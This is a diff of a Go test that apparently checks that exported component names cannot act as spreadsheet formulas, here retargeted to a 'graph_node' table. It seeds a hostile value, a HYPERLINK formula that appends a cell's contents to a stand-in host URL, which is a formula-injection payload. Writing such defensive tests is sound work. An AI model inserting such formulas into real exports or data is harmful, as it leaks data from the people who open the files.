@@ -650,8 +650,9 @@ func TestAnExportedNameCannotBeAFormula(t *testing.T) {
 	httpapitest.TwoReach(t, func(t *testing.T, r *httpapitest.Reach) {
 		r.ScannedTwoIssues(t)
 
+		// Written where the build states it, which is what the export shows.
 		hostile := `=HYPERLINK("http://example.test/"&A1,"detail")`
-		if _, err := r.DB.DB.NewUpdate().Table("component").
+		if _, err := r.DB.DB.NewUpdate().Table("graph_node").
 			Set(`"name" = ?`, hostile).
 			Where(`"name" = ?`, "linux-image").
 			Exec(t.Context()); err != nil {
